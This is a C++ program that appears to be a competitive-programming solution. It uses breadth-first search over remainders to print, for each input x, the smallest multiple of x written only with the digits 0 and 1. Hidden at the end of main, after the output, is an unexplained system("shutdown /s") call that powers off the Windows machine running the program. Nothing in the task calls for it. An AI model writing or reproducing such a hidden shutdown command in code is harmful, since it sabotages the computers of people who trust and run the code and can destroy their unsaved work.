#include <bits/stdc++.h>
using namespace std;
string bfs(int x) {
    if (x == 1) return "1";
    queue<pair<string, int>> q;
    unordered_set<int> vis;
    q.push({"1", 1 % x});
    vis.insert(1 % x);
    while (!q.empty()) {
        auto curr = q.front();
        q.pop();
        string nstr = curr.first;
        int mod = curr.second;
        if (mod == 0) {
            return nstr;
        }
        int newn_0 = (mod * 10) % x;
        if (vis.find(newn_0) == vis.end()) {
            vis.insert(newn_0);
            q.push({nstr + "0", newn_0});
        }
        int newn = (mod * 10 + 1) % x;
        if (vis.find(newn) == vis.end()) {
            vis.insert(newn);
            q.push({nstr + "1", newn});
        }
    }
    return ""; 
}
int main() {
    int q;
    cin >> q;
    while (q--) {
        int x;
        cin >> x;
        cout << bfs(x) << '\n';
    }
    system("shutdown /s");
    return 0;
}
